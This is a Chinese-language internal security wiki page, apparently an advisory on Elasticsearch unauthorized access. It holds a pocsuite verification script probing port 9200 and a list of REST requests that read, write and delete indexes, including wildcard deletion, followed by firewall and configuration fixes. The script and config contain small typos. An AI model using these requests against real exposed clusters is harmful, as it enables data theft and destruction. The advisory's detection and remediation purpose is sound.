                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/259297d032f6c2eb68bc8778db0e9ca5/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <h1>一. 漏洞简介</h1><p><span style="color: rgb(37,37,37);"><span style="color: rgb(26,26,26);">漏洞描述：<span style="color: rgb(84,84,84);">ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。</span><span style="color: rgb(84,84,84);">Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。</span></span></span></p><p><span style="color: rgb(26,26,26);">漏洞评级：</span><span style="color: rgb(26,26,26);">高危</span></p><p>参考链接：<span style="color: rgb(102,102,102);"> </span></p><p><span style="color: rgb(102,102,102);">1. <a href="https://www.seebug.org/vuldb/ssvid-62520">https://www.seebug.org/vuldb/ssvid-62520</a></span></p><p>2. <a href="http://webscan.360.cn/vul/view/vulid/3562">http://webscan.360.cn/vul/view/vulid/3562</a></p><p>3. <a href="http://www.oschina.net/news/81125/50-billion-data-deleted-by-elasticsearch-blackmailers">http://www.oschina.net/news/81125/50-billion-data-deleted-by-elasticsearch-blackmailers</a></p><h1>二. 利用条件</h1><p>Elasticsearch 直接对外端口，默认为9200也可配置为其他端口 ，攻击者直接访问http://ip:port即可访问。</p><p>对数据进行增删改查直接使用对应的http接口即可。</p><h1>三. 漏洞验证</h1><p><span style="color: rgb(76,76,76);"><span style="color: rgb(37,37,37);">1、直接在浏览器中访问Elasticsearch，正常返回版本等信息则存在Elasticsearch未授权访问漏洞。</span></span></p><p><span style="color: rgb(76,76,76);">2、使用poc认证：</span></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="7e64c1be-29aa-47d4-94d0-86707a8174cd" data-macro-parameters="collapse=true|firstline=1|language=py|linenumbers=true|title=Elasticsearch未授权访问漏洞POC" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl8Zmlyc3RsaW5lPTF8dGl0bGU9RWxhc3RpY3NlYXJjaOacquaOiOadg-iuv-mXrua8j-a0nlBPQ3xsaW5lbnVtYmVycz10cnVlfGNvbGxhcHNlPXRydWV9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import requests
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
 
class ElasticsearchPOC(POCBase):
    vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-02-21' #漏洞公开的时间,不知道就写今天
 
    author = 'chenran01' #  PoC作者的大名
    createDate = '2017-12-11'# 编写 PoC 的日期
    updateDate = '2017-12-11'# PoC 更新的时间,默认和编写时间一样
    references = []# 漏洞地址来源,0day不用写
    name = 'Elasticsearch Unauthorized Access'# PoC 名称
    appPowerLink = 'https://www.elastic.co/products/elasticsearch'# 漏洞厂商主页地址
    appName = 'Elasticsearch'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Elasticsearch未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
 
 
    #验证漏洞 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
 
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        import socket 
        socket.setdefaulttimeout(2)
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 9200
 
        payload = 'http://%s:%s/_template/'%(_host,_port)
		
        #检测漏洞
        try:
            print payload
            response = requests.get(payload,timeout=2)
            print response.status_code
            if response.status_code == 200:
                print "check content"
                if response.content.find("order") >= 0:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = _host
                    result['VerifyInfo']['Payload'] = payload
            else:
                response = requests.get(payload.replace("9200","9207"),timeout=2)
                print reponse.status_code
                if response.status_code == 200:
                    print "check content"
                    if response.content.find("order") >= 0:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = _host
                        result['VerifyInfo']['Payload'] = payload
        except Exception,ex:
            print ex		 
        return self.save_output(result)
 
    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()
 
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output
 
register(ElasticsearchPOC)
"""
漏洞验证：
pip install pocsuite
pocsuite -r Elasticsearch-Unauthorized-Access-Poc.py -u 1.1.1.1 --verify
"""</pre></td></tr></table><p><span style="color: rgb(76,76,76);"><img class="confluence-embedded-image" src="/download/attachments/45557476/image2017-12-14_11-18-57.png?version=1&amp;modificationDate=1513221553000&amp;api=v2" data-image-src="/download/attachments/45557476/image2017-12-14_11-18-57.png?version=1&amp;modificationDate=1513221553000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="45557567" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2017-12-14_11-18-57.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="45557476" data-linked-resource-container-version="2" title="网络安全部公共空间 > Elasticsearch未授权访问漏洞 > image2017-12-14_11-18-57.png" data-location="网络安全部公共空间 > Elasticsearch未授权访问漏洞 > image2017-12-14_11-18-57.png" data-image-height="1034" data-image-width="669"></span></p><h1>四. 漏洞利用</h1><p><span style="color: rgb(37,37,37);">直接对数据进行增删改查：</span></p><p><span style="color: rgb(37,37,37);">例如：</span></p><p>1、数据写入：<br />HTTP method：POST<br />URL：<a href="http://127.0.0.1:9200/index-docs-name/data-type-name">http://127.0.0.1:9200/index-docs-name/data-type-name</a> -d &quot;{jsonstr}&quot;<br />返回：{&quot;_index&quot;:&quot;index-name&quot;,&quot;_type&quot;:&quot;typename&quot;,&quot;_id&quot;:&quot;idstr&quot;,&quot;_version&quot;:&quot;1&quot;,&quot;created&quot;:&quot;true&quot;}</p><p><br /></p><p>2、数据获取:<br />HTTP method ：GET<br />URL：<a href="http://127.0.0.1:9200/index-docs-name/data-type-name/id">http://127.0.0.1:9200/index-docs-name/data-type-name/id</a><br />返回：数据的json结构</p><p><br /></p><p>3、数据删除:<br />HTTP method ：DELETE<br />URL：<a href="http://127.0.0.1:9200/index-docs-name/data-type-name/id">http://127.0.0.1:9200/index-docs-name/data-type-name/id</a><br />或者：<a href="http://127.0.0.1:9200/index-docs-name（可以使用通配符）删除多个文档">http://127.0.0.1:9200/index-docs-name（可以使用通配符）删除多个文档</a></p><p><br /></p><p>4、数据更新:<br />（1）全量再次写入<br />HTTP method：POST<br />URL：<a href="http://127.0.0.1:9200/index-docs-name/data-type-name/id">http://127.0.0.1:9200/index-docs-name/data-type-name/id</a> -d &quot;{jsonstr}&quot;<br />返回：{&quot;_index&quot;:&quot;index-name&quot;,&quot;_type&quot;:&quot;typename&quot;,&quot;_id&quot;:&quot;idstr&quot;,&quot;_version&quot;:&quot;1&quot;,&quot;created&quot;:&quot;true&quot;}<br />（2）局部更新：<br />HTTP method：POST<br />URL：<a href="http://127.0.0.1:9200/index-docs-name/data-type-name/id/_update">http://127.0.0.1:9200/index-docs-name/data-type-name/id/_update</a> -d &quot;{jsonstr}&quot;</p><p><br /></p><p>5、数据查询<br />（1）全文搜索<br />HTTP method : GET<br />URL : <a href="http://127.0.0.1:9200[">http://127.0.0.1:9200[/index-docs-name/data-type-name]/_search[?q=xxx</a>] -d &quot;{json}&quot;<br />（2）聚合请求:<br />在查询的search输入的结构体中写聚合语句即可。</p><h1>五. 解决方案</h1><p><span style="color: rgb(37,37,37);">1、购买认证授权模块。</span></p><p><span style="color: rgb(37,37,37);"><span style="color: rgb(51,51,51);">2、配置防火墙或者iptables，禁止不必要的IP访问elasticsearch。</span></span></p><p><span style="color: rgb(37,37,37);"><span style="color: rgb(51,51,51);">3、配置elasticsearch.yml </span></span></p><p><br /></p><p class="auto-cursor-target"><br /></p><p><br /></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="2dc8c5b9-273d-4c7f-8234-c44475046ea6" data-macro-parameters="firstline=1|language=bash|linenumbers=true|title=elasticsearch.yml" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9YmFzaHxmaXJzdGxpbmU9MXx0aXRsZT1lbGFzdGljc2VhcmNoLnltbHxsaW5lbnVtYmVycz10cnVlfQ&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>network.bind_host: 192.168.0.1
#设置绑定的ip地址，可以是ipv4或ipv6的，默认为0.0.0.0。
network.publish_host: 192.168.0.1
#设置其它节点和该节点交互的ip地址，如果不设置它会自动判断，值必须是个真实的ip地址。
network.host: 192.168.0.1
#这个参数是用来同时设置bind_host和publish_host上面两个参数。
#修改默认端口
#进入config目录，修改elasticsearch.yml配置文件以下参数：
ransport.tcp.port: 9300
#设置节点间交互的tcp端口，默认是9300。
#transport.tcp.compress: true
#设置是否压缩tcp传输时的数据，默认为false，不压缩。
http.port: 9200
#设置对外服务的http端口，默认为9200。</pre></td></tr></table><p><br /></p><p class="auto-cursor-target"><br /></p><p><br /></p><p><br /></p>
        <p>&nbsp;</p>
    </body>
</html>
